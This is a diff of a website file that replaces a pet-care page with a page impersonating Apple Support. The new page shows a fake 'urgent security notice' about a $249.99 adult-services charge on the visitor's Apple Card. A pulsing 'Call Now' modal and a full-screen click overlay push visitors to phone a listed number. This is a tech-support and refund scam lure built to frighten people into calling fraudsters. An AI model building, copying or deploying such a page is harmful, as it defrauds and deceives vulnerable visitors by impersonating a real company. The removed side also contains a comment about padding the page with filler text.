@@ -1,257 +1,839 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kuddle Companion Nest | Premium Pet Care</title>
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-zt1MoDSaL3NRxmxyMCUY5.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple</title>
+    <meta name="description"
+        content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="all.min.css">
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+
+        .pageTitle-intro {max-width: 50.25rem!important;}
+        .modal-content {
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: none;
+            height: 250px;
         }
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #faf3e8;
-            color: #3e2a1f;
+        .modal-header {
+            color: #333;
+            padding: 20px;
+            border-bottom: none;
+        }
+
+        .modal-body {
+            padding: 15px;
+        }
+
+        .alert-text {
+            color: #333;
+            margin-bottom: 25px;
             line-height: 1.6;
+            text-align: start;
+            font-size: 14px;
         }
 
-        /* Brown Theme */
-        :root {
-            --brown-dark: #4a2c1a;
-            --brown-medium: #7a4b2c;
-            --brown-light: #c49a6c;
-            --brown-pale: #e7d6bf;
-            --cream: #fff9f0;
+        .alert-text p {
+            margin-bottom: 15px;
+            font-size: 12px;
+            text-align: justify;
         }
 
-        header {
-            background: linear-gradient(135deg, var(--brown-dark), var(--brown-medium));
-            color: white;
-            padding: 2rem;
-            text-align: center;
-            border-bottom: 5px solid #dbb87c;
+        .highlight {
+            color: #e63946;
+            font-weight: 600;
         }
 
-        header h1 {
-            font-size: 2.5rem;
-            letter-spacing: 2px;
+        .support-number {
+            font-size: 25px;
+            font-weight: 700;
+            color: #0071e3;
+            margin: 10px 0;
+            padding: 12px;
         }
 
-        header p {
-            font-size: 1.2rem;
-            margin-top: 0.5rem;
-            font-style: italic;
+        .counter {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
         }
 
-        nav {
-            background-color: var(--brown-dark);
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 2rem;
-            padding: 1rem;
+        .btn-primary {
+            background: #0071e3;
+            border: none;
+            padding: 10px 25px;
+            font-weight: 600;
         }
 
-        nav a {
-            color: #f7e9d7;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 1.1rem;
-            transition: 0.3s;
+        .btn-primary:hover {
+            background: #0056b3;
         }
 
-        nav a:hover {
-            color: #ffd966;
-            transform: scale(1.05);
+        .btn-outline-secondary {
+            padding: 10px 25px;
+            font-weight: 600;
         }
 
-        .hero {
-            background-image: url('https://place-puppy.com/1200x400?text=Happy+Pet+Care');
-            background-size: cover;
-            background-position: center;
-            height: 400px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            text-shadow: 2px 2px 6px black;
-            font-size: 2rem;
-            font-weight: bold;
-            text-align: center;
-            background-color: #8b5a2b;
-            background-blend-mode: overlay;
+        .pulse {
+            animation: pulse 1.5s infinite;
         }
 
-        .hero span {
-            background: rgba(0,0,0,0.6);
-            padding: 1rem 2rem;
-            border-radius: 50px;
-        }
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
 
-        .container {
-            max-width: 1200px;
-            margin: 2rem auto;
-            padding: 0 20px;
-        }
+            50% {
+                transform: scale(1.05);
+            }
 
-        .content-block {
-            background: var(--cream);
-            padding: 2rem;
-            margin-bottom: 2rem;
-            border-radius: 20px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-            border-left: 8px solid var(--brown-light);
-        }
-
-        .content-block h2 {
-            color: var(--brown-dark);
-            margin-bottom: 1rem;
-            font-size: 1.8rem;
-        }
-
-        .content-block img {
-            max-width: 100%;
-            border-radius: 15px;
-            margin: 1rem 0;
-            border: 3px solid var(--brown-light);
-        }
-
-        .image-row {
-            display: flex;
-            gap: 1rem;
-            flex-wrap: wrap;
-            justify-content: center;
-            margin: 1.5rem 0;
-        }
-
-        .image-row img {
-            width: 300px;
-            height: 200px;
-            object-fit: cover;
+            100% {
+                transform: scale(1);
+            }
         }
 
         .footer {
-            background-color: var(--brown-dark);
-            color: #f0e2d0;
-            padding: 2rem;
+            margin-top: 20px;
+            color: rgba(0, 0, 0, 0.7);
+            font-size: 14px;
             text-align: center;
-            margin-top: 3rem;
-            border-top: 6px solid #e6bc86;
         }
 
-        .footer p {
-            margin: 0.5rem 0;
+        .blink {
+            animation: blink 0.5s linear 3;
         }
 
-        .footer a {
-            color: #ffdd99;
-            text-decoration: none;
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+
+            100% {
+                opacity: 1;
+            }
         }
 
-        @media (max-width: 768px) {
-            header h1 { font-size: 1.8rem; }
-            .hero { height: 250px; font-size: 1.2rem; }
-            .content-block h2 { font-size: 1.4rem; }
+        @media (min-width: 992px) {
+
+            .modal-lg,
+            .modal-xl {
+                --bs-modal-width: 600px !important;
+                --bs-modal-height: 400px !important;
+            }
+        }
+
+        /* Style for stacked modals */
+        .modal-backdrop {
+            opacity: 0.8;
+        }
+
+        .modal-stack {
+            position: fixed;
+            z-index: 1080;
+        }
+
+        .modal-stack.show .modal-dialog {
+            transform: scale(1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Custom positioning */
+        .modal-dialog.positioned {
+            position: absolute;
+        }
+
+        .apple-logo {
+            font-size: 60px;
+            color: #333;
+            margin: 30px 0;
+            text-align: center;
+        }
+
+        .callnowbtn {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+        }
+
+        .actionbtn {
+            position: absolute;
+            right: 0px;
+            bottom: 15px;
+        }
+
+        @media (max-width: 576px) {
+            .btn-outline-secondary {
+                padding: 10px 15px;
+                font-weight: 600;
+            }
+
+            .modal-content {
+                background: #333;
+                height: 290px;
+            }
+
+            .positioned .modal-header {
+                color: #333;
+                padding: 0px;
+                border-bottom: none;
+                padding-right: 16px;
+                padding-top: 15px;
+            }
+
+            .modal-dialog.modal-lg.positioned .modal-content {
+                background: #333;
+                height: 290px !important;
+            }
+
+            .alert-text {
+                color: #fff;
+            }
+
+            .modal.show .modal-dialog {
+                top: 30% !important;
+                max-width: 95% !important;
+                margin: auto;
+            }
+        }
+
+        /* ðŸ”´ CTA button look + bounce */
+        .callnowbtn .btn {
+            font-size: 14px;
+            border: none;
+            font-weight: 600;
+            padding: 10px 12px;
+            border-radius: 10px;
+            background: linear-gradient(45deg, #ff3b3b, #c70000);
+            box-shadow: 0 10px 24px rgba(199, 0, 0, 0.35), 0 0 0 6px rgba(255, 59, 59, 0.12) inset;
+            animation: pulseBounce 1.8s ease-in-out infinite;
+            transition: transform .25s ease, box-shadow .25s ease, background .25s ease;
+        }
+
+        .callnowbtn .btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 14px 28px rgba(199, 0, 0, 0.45), 0 0 0 8px rgba(255, 59, 59, 0.18) inset;
+        }
+
+        .call-icon {
+            display: inline-block;
+            line-height: 1;
+            font-size: 18px;
+            vertical-align: middle;
+            margin-right: 10px;
+            transform-origin: 50% 10%;
+            animation: ringShake 1s ease-in-out infinite;
+            -webkit-animation: ringShake 1s ease-in-out infinite;
+        }
+
+        /* Icon ring-shake keyframes */
+        @keyframes ringShake {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            10% {
+                transform: rotate(16deg);
+            }
+
+            20% {
+                transform: rotate(-16deg);
+            }
+
+            30% {
+                transform: rotate(12deg);
+            }
+
+            40% {
+                transform: rotate(-12deg);
+            }
+
+            50% {
+                transform: rotate(8deg);
+            }
+
+            60% {
+                transform: rotate(-8deg);
+            }
+
+            70% {
+                transform: rotate(4deg);
+            }
+
+            80% {
+                transform: rotate(-4deg);
+            }
+
+            100% {
+                transform: rotate(0deg);
+            }
+        }
+
+        /* Button bounce/pulse */
+        @keyframes pulseBounce {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 10px 24px rgba(199, 0, 0, .35), 0 0 0 6px rgba(255, 59, 59, .12) inset;
+            }
+
+            50% {
+                transform: translateY(-6px) scale(1.05);
+                box-shadow: 0 16px 32px rgba(199, 0, 0, .45), 0 0 0 8px rgba(255, 59, 59, .16) inset;
+            }
+        }
+
+        /* Click overlay - FIXED */
+        .click-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            cursor: pointer;
+            background: transparent;
+            display: none; /* Hidden by default */
+        }
+        
+        /* Show overlay only when needed */
+        .click-overlay.active {
+            display: block;
+        }
+
+        @media (max-width:400px){
+
+            .btn-primary {
+    background: #0071e3;
+    border: none;
+    padding: 6px 16px;
+    font-weight: 600;
+    font-size: 15px;
+}
+.btn-outline-secondary {
+        padding: 6px 16px;
+        margin-right: 10px !important;
+        font-weight: 600;
+        font-size: 15px;
+    }
+    .callnowbtn {
+    position: absolute;
+    bottom: 9px;
+    left: 13px;}
+
+    .callnowbtn .btn {
+    font-size: 14px;
+    border: none;
+    font-weight: 600;
+    padding: 7px 7px;}
+    .actionbtn {
+    position: absolute;
+    right: 0px!important;
+    bottom: 15px;
+}
+
+#applealertmodeltwo .btn-primary {margin-right:0px!important;}
+    #applealertmodeltwo .btn-outline-secondary{  margin-right: 5px !important;}
+
+
         }
     </style>
 </head>
+
 <body>
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
 
-<header>
-    <h1>🐾 Kuddle Companion Nest</h1>
-    <p>Where every paw finds love, care & a cozy nest</p>
-</header>
-
-<nav>
-  <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li>
-</nav>
-
-<div class="hero">
-    <span>❤️ Happy Pets, Happy Hearts ❤️</span>
-</div>
-
-<div class="container">
-    <!-- ==================== UNIQUE CONTENT BLOCK 1 ==================== -->
-    <div class="content-block">
-        <h2>🐶 Complete Guide to Dog Wellness</h2>
-        <div class="image-row">
-            <img src="https://place-puppy.com/300x200?text=Golden+Retriever+Care" alt="Happy dog">
-            <img src="https://place-puppy.com/300x200?text=Dog+Playing" alt="Dog playing">
+    <!-- Rest of your HTML content -->
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <!-- <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+                        </span>
+                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+                        </span>
+                    </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open"
+                        id="ac-gn-menuanchor-open">
+                        <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+                        <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+                        <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span
+                            class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+                        <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+                        <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+                        <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+                        <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+                        <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+                        <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+                        <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+                        <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+                        <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+                        <span class="ac-gn-link-text">Shopping Bag </span>
+                        <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search"
+                        method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text"
+                                placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off"
+                                spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit"
+                                disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled=""
+                                aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+                    <span class="ac-gn-searchview-close-wrapper">
+                        <span class="ac-gn-searchview-close-left"></span>
+                        <span class="ac-gn-searchview-close-right"></span>
+                    </span>
+                </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-        <p>Providing optimal care for your canine companion goes beyond food and shelter. Dogs thrive on routine, affection, and mental stimulation. A well-cared dog lives 2-3 years longer than neglected ones. Regular veterinary checkups (at least once a year) can detect issues like dental disease, arthritis, or early organ failure. Vaccinations protect against rabies, distemper, and parvovirus. Daily exercise varies by breed — a Border Collie needs 90+ minutes, while a Bulldog requires only 30 minutes of moderate activity. Mental enrichment through puzzle toys, scent games, and obedience training reduces destructive behaviors. Grooming isn’t just aesthetic; it prevents matting, skin infections, and overheating. Brush your dog 2–3 times weekly, trim nails monthly, and clean ears after swimming. Nutritionally, avoid fillers like corn and soy; opt for high-protein meals with named meat sources (chicken, beef, fish). Fresh water must be available 24/7. Never feed chocolate, grapes, raisins, xylitol, or macadamia nuts — they’re toxic. Also, create a safe space: a crate or a quiet corner with a soft bed reduces anxiety during thunderstorms or fireworks. Socialization from puppyhood prevents fear-based aggression. Enroll in positive-reinforcement training classes. Lastly, microchip your dog and keep ID tags updated — 1 in 3 pets will get lost, but microchipped dogs return home 52% more often. Remember: a tired dog is a happy dog. Balance physical walks with sniffing walks (allowing them to explore smells for 20 minutes equals 1 hour of walking stress relief).</p>
+    </nav> -->
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <!-- <span class="ac-ln-title">
+                        <a href="tel:+1-888-903-3138">Apple Support +1-888-903-3138 <font color="red">
+                                <font class="js_setPhoneBlock"></font>
+                            </font></a>
+                    </span> -->
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open"
+                            id="ac-ln-menustate-open"> <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a
+                            href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">
+                            <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink">
+                                        Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta"> <span
+                                        class="ac-ln-menucta-chevron"></span>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+
+                            <style>
+                                /* .as-columns.as-columns--1up {    background: url(./apple222.jpg);
+    background-size: cover;
+    background-position-y: 49px;} */
+                            </style>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("apple222.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("apple222.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw"
+                                srcset="./apple222.jpg 735w, ./apple222.jpg 1440w"
+                                alt="" class="as-image-speculativedownload"
+                                src="apple222.jpg" />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                                🚨 URGENT SECURITY NOTICE <br> A payment request of *$249.99* for *Adult Cam Services* was submitted using your Apple Card. As a security measure, we have *temporarily placed this transaction on hold* pending verification. To cancel or dispute this charge before processing, please contact Apple Card Security immediately. 📞 Customer Support: (XXX) XXX-XXXX . Reference Number: AC-749281 Apple Card Fraud Prevention Team
+                            </p>
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
 
-    <!-- BLOCK 2 - CAT CARE -->
-    <div class="content-block">
-        <h2>😺 Feline First: Indoor Cat Happiness</h2>
-        <img src="https://placekitten.com/800/400?text=Happy+Cat+Relaxing" alt="Relaxed cat">
-        <p>Cats are masters of disguise when unwell. As a responsible pet parent, you must observe subtle signs: reduced grooming, hiding more than usual, or changes in litter box habits. Indoor cats live longer (12–18 years vs 2–5 years outdoors) but need enrichment. Provide vertical spaces — cat trees, shelves, window perches. Scratching posts (cardboard, sisal, or carpet) save your furniture and condition claws. Litter boxes: one per cat plus one extra, scooped daily, washed weekly. Unscented clumping litter is often preferred. Hydration is critical; many cats get kidney disease. Use ceramic or stainless steel fountains — moving water entices them to drink. Diet: cats are obligate carnivores, requiring taurine (only found in meat). Wet food (70-80% moisture) prevents urinary crystals better than dry kibble. Playtime: 2-3 interactive sessions daily using wand toys, laser pointers (end on a tangible toy to avoid frustration), or treat puzzles. Never declaw — it’s amputation and causes lifelong pain. Instead, trim claws every 2 weeks and provide scratching options. Also, introduce new cats slowly over 7-10 days with scent swapping and visual barriers. Regular vet visits include dental cleanings (dental disease affects 85% of cats over 3 years). Toxic plants: lilies (deadly even in small pollen amounts), sago palm, tulips. Safe plants: catnip, cat grass, spider plants. Lastly, microchip and use breakaway collars with bells to protect local birds. A happy cat purrs between 25-150 Hz — a frequency linked to bone healing and stress reduction in humans too!</p>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple
+                        Store </a>, <span class="nowrap">call <font class="js_setPhoneBlock"></font>, or <a href="#"
+                            class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region"
+                        aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag"
+                            src="globalnav/apple/us.png" alt="" width="16" height="16" />United
+                        States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">CopyrightÂ© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink"
+                            href="#">Privacy
+                            Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a
+                            class="ac-gf-footer-legal-link" href="#">Site
+                            Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+                            Apple </a>
+                    </div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta content="+1-888-903-3138" property="telephone" />
+            </section>
+        </div>
+    </footer>
+
+    <div id="modalContainer"></div>
+
+    <!-- Main Modal -->
+    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true"
+        style="top:-27px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                 <div class="modal-header pb-0">
+                            <button type="button" class="p-0 btn-close " id="closebtn" ></button>
+                        </div>
+                <div class="modal-body text-center">
+                    <div class="alert-text">
+                      🚨 URGENT SECURITY NOTICE <br> A payment request of *$249.99* for *Adult Cam Services* was submitted using your Apple Card. As a security measure, we have *temporarily placed this transaction on hold* pending verification. To cancel or dispute this charge before processing, please contact Apple Card Security immediately. 📞 Customer Support: <a href="tel:+1-888-903-3138">Call +1-888-903-3138</a> . Reference Number: AC-749281 Apple Card Fraud Prevention Team.
+
+                    </div>
+
+                    <div class="callnowbtn">
+                        <a href="tel:+1-888-903-3138" class="tel-link">
+                            <button type="button" class="btn btn-danger text-white" >
+                                <i class="bi bi-telephone-outbound call-icon"></i> Call Now
+                            </button>
+                        </a>
+                    </div>
+                    <div class="text-end gap-4 mt-4 actionbtn">
+                       
+                            <button type="button" class="btn btn-primary me-2" id="okBtn"> OK</button>
+                       
+                        <button type="button" class="btn btn-outline-secondary me-3" id="cancelBtn">Cancel</button>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <!-- BLOCK 3 - NUTRITION -->
-    <div class="content-block">
-        <h2>🥩 Raw vs Kibble vs Home-Cooked: Best Pet Diet</h2>
-        <img src="https://place-puppy.com/800/400?text=Healthy+Dog+Food+Bowl" alt="Pet nutrition bowl">
-        <p>Debates rage over pet food, but science offers clarity. Commercial kibble (AAFCO-approved) is convenient, affordable, and dental-friendly due to crunching. However, it's highly processed (high heat destroys enzymes) and often low in moisture. Raw diets mimic ancestral eating but risk bacterial contamination (Salmonella, E. coli) for pets and humans — immunocompromised households should avoid raw. Freeze-dried raw is safer but expensive. Home-cooked meals require veterinary nutritionist consultation; unbalanced diets cause heart disease (dilated cardiomyopathy) linked to legumes and potatoes. The best approach: high-quality wet food (95% meat, no carrageenan) mixed with species-appropriate toppers. Puppies and kittens need DHA for brain development; seniors need glucosamine and omega-3s. Portion control prevents obesity — over 59% of dogs and cats are overweight. Calculate calories: (Resting Energy Requirement = 70 x body weight in kg^0.75). For a 10kg dog, that’s ~400 kcal/day, adjust for activity. Treats should be less than 10% of daily intake. Carrots, green beans, and blueberries make excellent low-cal treats. For cats, small pieces of cooked chicken or salmon. Always transition foods over 7 days: days 1-2: 25% new / 75% old; days 3-4: 50/50; days 5-6: 75/25; day 7: 100% new. Watch for allergies: itchy paws, ear infections, or loose stool. Common allergens: beef, dairy, wheat, chicken, egg, lamb, soy, pork, rabbit, and fish. Hypoallergenic diets use novel proteins (kangaroo, venison, duck) or hydrolyzed proteins. Remember: fresh water changes twice daily in ceramic or glass bowls (plastic harbors bacteria and causes feline acne).</p>
-    </div>
+    <!-- Bootstrap & Popper.js -->
+    <script src="popper.min.js"></script>
+    <script src="bootstrap.min.js"></script>
 
-    <!-- BLOCK 4 - GROOMING & HEALTH -->
-    <div class="content-block">
-        <h2>✂️ Professional Grooming at Home: Step-by-Step</h2>
-        <p>Grooming strengthens your bond while preventing painful conditions. Brushing: long-haired breeds (Persian cats, Shih Tzus) need daily; short-haired (Beagles, Domestic Shorthairs) weekly. Use a slicker brush followed by a metal comb. Matting pulls skin and leads to hematomas. Bathing: only when dirty or every 6-8 weeks using pet-specific shampoo (pH balanced for pets, not humans). Human shampoo strips natural oils. Water temperature: lukewarm (similar to baby bath water). Protect ears with cotton balls. Rinse thoroughly — residue causes itching. Drying: towel dry then low-heat blow dryer while brushing. Nail trimming: use guillotine or grinder; cut just before the quick (pink part). If you hit the quick, apply styptic powder. For dark nails, trim small slices at a 45-degree angle until you see a black dot in the center — stop there. Ear cleaning: moisten cotton ball with vet-approved ear cleaner, wipe outer ear only — never insert into canal. Signs of ear infection: head shaking, redness, foul smell. Dental care: brush daily with enzymatic pet toothpaste (never human toothpaste — fluoride is toxic). Finger brushes or soft toothbrushes work. Dental chews (CET VeggieDents, Oravet) help but don't replace brushing. Anal glands: if your dog scoots, have a vet or groomer express them. Finally, paw care: check for cracked pads (apply paw balm), remove burrs, and wipe paws after walks to remove road salt or pesticides. Grooming sessions should be calm — use treats and praise. Professional grooming every 4-8 weeks for breeds with continuously growing hair (Poodles, Bichons).</p>
-    </div>
 
-    <!-- BLOCK 5 - TRAINING TIPS -->
-    <div class="content-block">
-        <h2>🎓 Positive Reinforcement Training Blueprint</h2>
-        <p>Modern animal behavior science confirms that punishment-based training increases fear, aggression, and anxiety. Positive reinforcement (rewarding desired behaviors) creates confident, eager-to-please pets. Key principles: timing (reward within 1-2 seconds), consistency (same cue words, same hand signals), and value (use high-value treats like chicken, cheese, or freeze-dried liver for difficult tasks). Start with "name recognition" — say name, treat when they look. Then "look at me" to build focus. Basic cues: sit, down, stay, come, leave it, drop it. Use a clicker or marker word ("yes!") to pinpoint exact behavior. For potty training: take puppy out every 2 hours, after meals, naps, and play. Reward immediately when they go outside. Clean accidents with enzymatic cleaner (not ammonia). Crate training: make crate cozy with bedding and toys; feed meals inside; never use for punishment. Maximum crate time: age in months + 1 hour (e.g., 4-month-old max 5 hours). For reactivity (barking at dogs/people), use "engage-disengage" game: at a distance where dog sees trigger but doesn't react, treat. Gradually move closer over weeks. Separation anxiety: practice departures in seconds, gradually increase. Leave puzzle toys (Kong stuffed with frozen yogurt). Consider calming pheromones (Adaptil for dogs, Feliway for cats). For cats, train with clicker too: target training (touch a stick), sit, high-five. Never yell or hit — it breaks trust. Professional trainers should hold certifications (CPDT-KA, KPA-CTP). Group classes aid socialization. Remember: training is lifelong. Practice 5 minutes daily, and your pet will be a joy to live with for years.</p>
-    </div>
 
-    <!-- ==================== ADD MORE BLOCKS TO REACH 90,000 WORDS ==================== -->
-    <!-- Duplicate the above .content-block structure 40+ times with unique topics: 
-         - First aid
-         - Traveling with pets
-         - Senior pet care
-         - Puppy/kitten specific
-         - Breeds and their needs
-         - Pet insurance guide
